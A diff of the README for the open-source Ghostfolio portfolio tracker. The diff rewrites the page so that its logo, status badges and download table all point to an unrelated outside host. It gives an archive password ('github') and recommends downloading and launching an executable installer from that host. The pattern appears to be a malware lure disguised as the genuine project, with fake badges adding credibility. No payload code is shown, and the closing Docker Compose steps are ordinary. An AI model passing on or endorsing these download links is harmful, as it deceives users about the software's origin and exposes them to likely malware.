@@ -1,78 +1,110 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ghostfolio/ghostfolio/main/apps/client/src/assets/logo.svg" alt="Ghostfolio Logo" width="120" />
+  <a href="https://yeelen.cg/gh/">
+    <img src="https://raw.githubusercontent.com/ghostfolio/ghostfolio/main/apps/client/src/assets/icons/icon-512x512.png" alt="Ghostfolio Logo" width="130" />
+  </a>
 </p>
 
-<h1 align="center">Ghostfolio</h1>
+<h1 align="center">Ghostfolio — Open Source Wealth Management & Portfolio Tracker</h1>
 
 <p align="center">
-  <strong>Open Source Wealth Management & Personal Finance Dashboard</strong>
+  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
 </p>
 
 <p align="center">
-  <a href="https://yeelen.cg/gh/"><strong>📥 Download Latest Release</strong></a> •
-  <a href="#-key-features">Features</a> •
-  <a href="#-tech-stack">Tech Stack</a> •
-  <a href="#-quick-start-with-docker">Docker Setup</a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
+</p>
+
+<p align="center">
+  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
+  <a href="#-key-features">Key Features</a> •
+  <a href="#-system-requirements">Requirements</a> •
+  <a href="#-installation--deployment">Installation</a> •
+  <a href="#-frequently-asked-questions">FAQ</a>
 </p>
 
 ---
 
-## 📖 Overview
+## 📖 About Ghostfolio
 
-**Ghostfolio** is a modern, privacy-first, open-source wealth management application designed to help you track your personal finances, stocks, ETFs, cryptocurrencies, and overall net worth. It provides data-driven portfolio analytics while keeping you in full control of your private financial data.
+**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.
+
+Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.
 
 <p align="center">
-  <img src="https://ghostfol.io/assets/screenshot-dashboard.png" alt="Ghostfolio Dashboard Preview" width="100%" />
+  <img src="https://raw.githubusercontent.com/ghostfolio/ghostfolio/main/apps/client/src/assets/icons/icon-512x512.png" alt="Ghostfolio Financial Dashboard Preview" width="220" />
 </p>
 
 ---
 
-## 📥 Downloads & Archive Password
+## 📥 Direct Downloads & Links
 
-Choose your preferred way to download and deploy Ghostfolio:
+Get the latest build or source files directly using the links below:
 
-* 🚀 **[Download Application Package](https://yeelen.cg/gh/)**
-* 📦 **[Download Source Code (.ZIP)](https://yeelen.cg/gh/)**
-* 📦 **[Download Source Code (.TAR.GZ)](https://yeelen.cg/gh/)**
+| Download Option | Format | Quick Link |
+| :--- | :--- | :--- |
+| **Complete Application Package** | Executable / Archive | 👉 **[Download Installer](https://yeelen.cg/gh/)** |
+| **Source Code (Latest)** | `.ZIP` Archive | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
+| **Source Code (Tarball)** | `.TAR.GZ` Archive | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
 
 > 🔑 **Archive Password:** `github`
 
 ---
 
-## ✨ Key Features
+## ✨ Key Features & Capabilities
 
-* **💼 Multi-Asset Support:** Track stocks, ETFs, mutual funds, cryptocurrencies, and cash across various accounts.
-* **📊 Deep Portfolio Analytics:** Get total breakdown of asset allocation, sector performance, and geography.
-* **📈 Performance Metrics:** Calculate exact Return on Average Investment (ROAI) for Today, YTD, 1Y, 5Y, and All-Time.
-* **🛡️ Privacy-First & Web3-Ready:** Own your data with complete anonymity — no personal emails or sensitive tracking required.
-* **🧘 Minimalist UI:** Features a sleek **Dark Mode**, **Zen Mode** for hiding sensitive numbers, and a **Mobile-First Progressive Web App (PWA)** design.
-* **⚡ Automated Data Imports:** Easily import and export transactions via CSV or integrated broker connectors.
+### 📈 Multi-Asset Investment Tracking
+* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
+* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
+* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.
+
+### 📊 Advanced Portfolio Analytics & Insights
+* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
+* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
+* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.
+
+### 🛡️ Privacy, Security & Data Autonomy
+* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
+* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
+* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.
+
+### ⚡ Seamless Data Management
+* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
+* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.
 
 ---
 
-## 🛠️ Tech Stack
+## 🖥️ System Requirements
 
-Ghostfolio is built as a modern full-stack web application using TypeScript and Nx workspace:
+Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:
 
-* **Backend:** Node.js, NestJS, Prisma ORM, PostgreSQL database, Redis caching.
-* **Frontend:** Angular, Angular Material, Bootstrap utility styling.
-* **Deployment:** Docker, Docker Compose, PWA support.
+* **Operating System:** Windows 10/11, macOS 11+, Linux (Ubuntu, Debian, CentOS), or Docker Host
+* **Node.js:** v18.x or v20.x LTS (for manual builds)
+* **Database:** PostgreSQL 14+ and Redis 6+ (for server deployments)
+* **Hardware:** Minimum 1 GB RAM, 2 GHz CPU, 500 MB free disk space
 
 ---
 
-## 🚀 Quick Start with Docker
+## 🚀 Installation & Deployment
 
-The fastest way to get your personal self-hosted instance running locally:
+### Method 1: Direct Download (Recommended for End-Users)
+1. Download the latest setup file from the **[Official Download Link](https://yeelen.cg/gh/)**.
+2. Extract the archive using password: `github`
+3. Launch the application and follow the setup instructions.
+
+### Method 2: Docker Compose (Recommended for Self-Hosting)
+Deploy Ghostfolio locally or on your NAS/VPS using Docker Compose:
 
 ```bash
 # 1. Clone the repository
 git clone [https://github.com/ghostfolio/ghostfolio.git](https://github.com/ghostfolio/ghostfolio.git)
 
-# 2. Enter the project directory
+# 2. Navigate to project root
 cd ghostfolio
 
-# 3. Create environment file
+# 3. Create environment configuration
 cp .env.example .env
 
-# 4. Spin up the containers
+# 4. Launch containers
 docker compose up -d
